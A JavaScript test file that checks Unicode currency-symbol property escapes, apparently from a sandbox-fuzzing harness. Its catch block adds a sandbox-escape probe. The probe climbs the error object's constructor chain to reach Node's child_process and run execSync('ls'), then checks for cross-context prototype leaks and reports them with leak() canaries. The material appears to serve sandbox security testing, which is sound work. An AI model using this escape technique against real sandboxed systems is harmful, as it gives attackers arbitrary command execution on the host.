try {
    const matchSymbols = buildString({
        loneCodePoints: [
            36,
            1423,
            1547,
            2555,
            2801,
            3065,
            3647,
            6107,
            43064,
            65020,
            65129,
            65284,
            123647,
            126128
        ],
        ranges: [
            [
                162,
                165
            ],
            [
                2046,
                2047
            ],
            [
                2546,
                2547
            ],
            [
                8352,
                8383
            ],
            [
                65504,
                65505
            ],
            [
                65509,
                65510
            ],
            [
                73693,
                73696
            ]
        ]
    });
    testPropertyEscapes(/^\p{General_Category=Currency_Symbol}+$/u, matchSymbols, '\\p{General_Category=Currency_Symbol}');
    testPropertyEscapes(/^\p{General_Category=Sc}+$/u, matchSymbols, '\\p{General_Category=Sc}');
    testPropertyEscapes(/^\p{gc=Currency_Symbol}+$/u, matchSymbols, '\\p{gc=Currency_Symbol}');
    testPropertyEscapes(/^\p{gc=Sc}+$/u, matchSymbols, '\\p{gc=Sc}');
    testPropertyEscapes(/^\p{Currency_Symbol}+$/u, matchSymbols, '\\p{Currency_Symbol}');
    testPropertyEscapes(/^\p{Sc}+$/u, matchSymbols, '\\p{Sc}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                35
            ],
            [
                37,
                161
            ],
            [
                166,
                1422
            ],
            [
                1424,
                1546
            ],
            [
                1548,
                2045
            ],
            [
                2048,
                2545
            ],
            [
                2548,
                2554
            ],
            [
                2556,
                2800
            ],
            [
                2802,
                3064
            ],
            [
                3066,
                3646
            ],
            [
                3648,
                6106
            ],
            [
                6108,
                8351
            ],
            [
                8384,
                43063
            ],
            [
                43065,
                56319
            ],
            [
                57344,
                65019
            ],
            [
                65021,
                65128
            ],
            [
                65130,
                65283
            ],
            [
                65285,
                65503
            ],
            [
                65506,
                65508
            ],
            [
                65511,
                73692
            ],
            [
                73697,
                123646
            ],
            [
                123648,
                126127
            ],
            [
                126129,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{General_Category=Currency_Symbol}+$/u, nonMatchSymbols, '\\P{General_Category=Currency_Symbol}');
    testPropertyEscapes(/^\P{General_Category=Sc}+$/u, nonMatchSymbols, '\\P{General_Category=Sc}');
    testPropertyEscapes(/^\P{gc=Currency_Symbol}+$/u, nonMatchSymbols, '\\P{gc=Currency_Symbol}');
    testPropertyEscapes(/^\P{gc=Sc}+$/u, nonMatchSymbols, '\\P{gc=Sc}');
    testPropertyEscapes(/^\P{Currency_Symbol}+$/u, nonMatchSymbols, '\\P{Currency_Symbol}');
    testPropertyEscapes(/^\P{Sc}+$/u, nonMatchSymbols, '\\P{Sc}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}